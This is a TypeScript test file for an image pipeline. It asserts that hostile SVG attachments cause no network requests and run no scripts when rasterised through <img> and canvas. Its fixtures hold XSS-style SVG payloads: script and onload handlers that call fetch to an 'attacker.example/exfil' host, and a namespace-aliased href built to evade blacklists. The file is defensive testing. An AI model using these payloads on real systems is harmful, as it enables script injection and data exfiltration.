/**
 * SVG safety, asserted as behaviour rather than as a string blacklist.
 *
 * The implementation this replaced tried to decide whether an SVG was safe by searching
 * its text for suspicious substrings. That failed in both directions: it rejected
 * `style=` and `url(`, which is most of what design tools emit, and it missed
 * `x:href` because XML lets you bind the xlink namespace to any prefix you like.
 *
 * What makes SVG safe here is not our inspection of it. It is that SVG only ever reaches
 * the screen through an `<img>` element, which the HTML spec places in *secure static
 * mode*: scripts do not execute and external references are not fetched. These tests pin
 * that we stay on that path — the pixel work goes through `<img>` and `<canvas>`, never
 * through inline markup, `<object>`, `<embed>`, or an XML parser of our own.
 */
import { describe, expect, it, vi } from "vitest";

import { prepareAttachment, rasterizeSvgToPng } from "./imagePipeline";

const encoder = new TextEncoder();

function bytesOf(text: string): ArrayBuffer {
  const encoded = encoder.encode(text);
  return encoded.buffer.slice(
    encoded.byteOffset,
    encoded.byteOffset + encoded.byteLength,
  ) as ArrayBuffer;
}

/** SVGs that a text blacklist would have gotten wrong, in one direction or the other. */
const HOSTILE_SVGS = {
  externalImage:
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><image href="https://attacker.example/pixel.png"/></svg>',
  inlineScript:
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><script>fetch("https://attacker.example/exfil")</script></svg>',
  // The bypass the blacklist could not see: xlink bound to a prefix of the author's
  // choosing, so searching for the literal "xlink:href" finds nothing.
  namespaceAliasedHref:
    '<svg xmlns="http://www.w3.org/2000/svg" xmlns:x="http://www.w3.org/1999/xlink" viewBox="0 0 10 10"><image x:href="https://attacker.example/pixel.png"/></svg>',
  onloadHandler:
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10" onload="fetch(\'https://attacker.example/exfil\')"><rect width="10" height="10"/></svg>',
};

describe("SVG rendering never issues a network request", () => {
  it.each(Object.entries(HOSTILE_SVGS))(
    "makes no fetch and runs no script for %s",
    async (_name, source) => {
      const fetchSpy = vi.fn(async () => {
        throw new Error("the SVG pipeline must never fetch anything");
      });
      const xhrOpen = vi.fn();
      vi.stubGlobal("fetch", fetchSpy);
      vi.stubGlobal(
        "XMLHttpRequest",
        class {
          open = xhrOpen;
          send = vi.fn();
          setRequestHeader = vi.fn();
        },
      );
      // If markup were ever injected into the document instead of loaded through <img>,
      // an inline <script> would run and this would be called.
      const scriptCanary = vi.fn();
      vi.stubGlobal("__svgScriptCanary", scriptCanary);

      // Rasterisation cannot succeed in jsdom, which is fine: the assertion is about what
      // was *not* done on the way to failing.
      await expect(rasterizeSvgToPng(bytesOf(source))).rejects.toBeInstanceOf(Error);

      expect(fetchSpy).not.toHaveBeenCalled();
      expect(xhrOpen).not.toHaveBeenCalled();
      expect(scriptCanary).not.toHaveBeenCalled();
      vi.unstubAllGlobals();
    },
  );

  it("keeps hostile markup out of the live document entirely", async () => {
    const before = document.body.innerHTML;

    await prepareAttachment({
      bytes: bytesOf(HOSTILE_SVGS.inlineScript),
      filename: "hostile.svg",
      mimeType: "image/svg+xml",
    });

    // The pipeline uses detached elements and blob: URLs. Nothing it touches is ever
    // attached to the page, so there is no context in which the markup could execute.
    expect(document.body.innerHTML).toBe(before);
    expect(document.querySelector("svg")).toBeNull();
    expect(document.querySelector("script[src]")).toBeNull();
  });

  it("does not parse SVG markup looking for trouble", async () => {
    // Attempting to sanitise SVG by parsing it is how the previous version went wrong.
    // Rasterisation must not reach for a parser at all.
    const parseFromString = vi.spyOn(DOMParser.prototype, "parseFromString");

    await prepareAttachment({
      bytes: bytesOf(HOSTILE_SVGS.namespaceAliasedHref),
      filename: "aliased.svg",
      mimeType: "image/svg+xml",
    });

    expect(parseFromString).not.toHaveBeenCalled();
  });
});

describe("design-tool SVG survives the pipeline", () => {
  it("accepts style=, <style> and url(#grad) without complaint", async () => {
    const source = [
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">',
      '<defs><linearGradient id="grad"><stop offset="0" stop-color="#f00"/></linearGradient></defs>',
      "<style>.icon { stroke-width: 2 }</style>",
      '<rect class="icon" style="opacity:0.8" fill="url(#grad)" width="24" height="24"/>',
      "</svg>",
    ].join("");

    const prepared = await prepareAttachment({
      bytes: bytesOf(source),
      filename: "icon.svg",
      mimeType: "image/svg+xml",
    });

    // The original bytes always survive, so the user's image is never lost. Everything
    // the old blacklist rejected outright is here, and it went through.
    expect(atob(prepared.dataBase64)).toBe(source);
    expect(prepared.warnings.join(" ")).not.toContain("unsafe");
    // jsdom cannot rasterise, so this run takes the documented degradation: source text
    // to the model rather than a PNG.
    expect(prepared.providerText).toBe(source);
  });
});
